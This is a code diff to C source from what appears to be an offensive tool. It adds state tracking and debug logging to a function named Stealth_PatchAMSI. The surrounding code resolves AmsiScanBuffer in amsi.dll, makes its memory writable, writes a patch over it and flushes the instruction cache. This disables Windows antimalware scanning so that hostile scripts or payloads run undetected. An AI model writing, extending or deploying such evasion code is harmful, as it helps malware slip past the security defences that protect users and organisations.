@@ -38,6 +38,18 @@ typedef enum AMSI_RESULT {
 } AMSI_RESULT;
 #endif
 
+static BOOL g_AmsiPatchActive = FALSE;
+
+void Stealth_SetAmsiBypassState(BOOL active)
+{
+    g_AmsiPatchActive = (active ? TRUE : FALSE);
+}
+
+BOOL Stealth_IsAmsiPatched(void)
+{
+    return g_AmsiPatchActive;
+}
+
 // ================================================================
 // AMSI Bypass
 // ================================================================
@@ -63,6 +75,8 @@ BOOL Stealth_PatchAMSI(void)
     if (!hAmsi)
     {
         // AMSI not loaded - might not be present on this system
+        Stealth_SetAmsiBypassState(FALSE);
+        Stealth_DebugPrintfA("amsi.dll not loaded; AMSI bypass not required");
         return TRUE;  // Not an error, just not available
     }
 
@@ -70,6 +84,7 @@ BOOL Stealth_PatchAMSI(void)
     pAmsiScanBuffer = (AmsiScanBuffer_t)GetProcAddress(hAmsi, "AmsiScanBuffer");
     if (!pAmsiScanBuffer)
     {
+        Stealth_SetAmsiBypassState(FALSE);
         FreeLibrary(hAmsi);
         return FALSE;
     }
@@ -94,6 +109,13 @@ BOOL Stealth_PatchAMSI(void)
         FlushInstructionCache(GetCurrentProcess(), pAmsiScanBuffer, sizeof(patch));
 
         success = TRUE;
+        Stealth_SetAmsiBypassState(TRUE);
+        Stealth_DebugPrintfA("AMSI patch applied at %p", pAmsiScanBuffer);
+    }
+    else
+    {
+        Stealth_SetAmsiBypassState(FALSE);
+        Stealth_DebugPrintfA("VirtualProtect failed while patching AMSI (error %lu)", GetLastError());
     }
 
     FreeLibrary(hAmsi);
